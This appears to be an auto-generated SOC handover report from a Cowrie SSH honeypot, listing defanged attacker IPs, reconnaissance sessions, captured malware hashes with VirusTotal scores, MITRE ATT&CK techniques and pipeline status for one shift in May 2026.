**Recommended Actions:**
- [ ] Submit `180.184.51[.]110` to AbuseIPDB if not already reported
- [ ] Block `180.184.51[.]110` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c19b2e8f8115

| Field | Detail |
|---|---|
| **Source IP** | `180.184.51[.]110` |
| **First Seen** | 2026-05-27 22:44 |
| **Last Seen** | 2026-05-27 22:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-27 22:44:54` | `cowrie.session.connect` |
| `2026-05-27 22:44:54` | `cowrie.client.version` |
| `2026-05-27 22:44:55` | `cowrie.client.kex` |
| `2026-05-27 22:44:55` | `cowrie.login.success` |
| `2026-05-27 22:44:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.51[.]110` to AbuseIPDB if not already reported
- [ ] Block `180.184.51[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `120.48.76[.]190` | **17** | 2026-05-27 21:02 | 2026-05-27 21:30 | 30m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `206.189.25[.]100` | **4** | 2026-05-27 20:35 | 2026-05-27 22:52 | 3m | 0 | `T1592` | 🟢 LOW |
| `154.198.162[.]75` | **2** | 2026-05-27 20:45 | 2026-05-27 20:48 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `20.163.13[.]114` | **2** | 2026-05-27 21:21 | 2026-05-27 21:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `113.161.39[.]122` | 1 | 2026-05-27 22:40 | 2026-05-27 22:40 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.240.236[.]178` | 1 | 2026-05-27 20:25 | 2026-05-27 20:25 | 8s | 0 | `T1592` | 🟢 LOW |
| `120.48.106[.]235` | 1 | 2026-05-27 21:07 | 2026-05-27 21:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.152[.]13` | 1 | 2026-05-27 21:21 | 2026-05-27 21:22 | 66s | 1 | `T1110.001` | 🟢 LOW |
| `121.137.131[.]78` | 1 | 2026-05-27 21:59 | 2026-05-27 21:59 | 13s | 0 | `T1592` | 🟢 LOW |
| `180.184.51[.]110` | 1 | 2026-05-27 22:44 | 2026-05-27 22:44 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.146[.]235` | 1 | 2026-05-27 20:38 | 2026-05-27 20:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.236[.]214` | 1 | 2026-05-27 22:44 | 2026-05-27 22:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.42.93[.]139` | 1 | 2026-05-27 22:50 | 2026-05-27 22:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `190.181.4[.]12` | 1 | 2026-05-27 22:44 | 2026-05-27 22:44 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.134.208[.]91` | 1 | 2026-05-27 22:41 | 2026-05-27 22:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `39.64.61[.]184` | 1 | 2026-05-27 21:26 | 2026-05-27 21:27 | 13s | 0 | `T1592` | 🟢 LOW |
| `84.240.206[.]218` | 1 | 2026-05-27 20:37 | 2026-05-27 20:37 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `91.230.168[.]73` | 1 | 2026-05-27 22:32 | 2026-05-27 22:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]77` | 1 | 2026-05-27 22:32 | 2026-05-27 22:32 | 11s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `91.230.168[.]77` | US | FR ONYPHE | **100** ⚠️ | 50 |
| `120.48.152[.]13` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 14 |
| `180.76.236[.]214` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 33 |
| `206.189.25[.]100` | GB | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `154.198.162[.]75` | HK | SCLOUD PTE.LTD. | **100** ⚠️ | 50 |
| `36.134.208[.]91` | CN | China Mobile Communications Corporation | **100** ⚠️ | 13 |
| `180.76.146[.]235` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `120.48.106[.]235` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 20 |
| `84.240.206[.]218` | KZ | LLC QAZCLOUD | **100** ⚠️ | 11 |
| `121.137.131[.]78` | KR | Korea Telecom | **100** ⚠️ | 26 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 40 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 11 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 9 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 6 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |

---

## 🔕 False Positive Summary (8 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 59 cases |
| Tool 34  | Credential Extractor        | ✅ 20 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 26 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 8 filtered (13.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 17 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 11 priority case(s) shown individually · 19 recon entry/entries in table (4 group(s) consolidating 25 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-27T23:21:05Z_
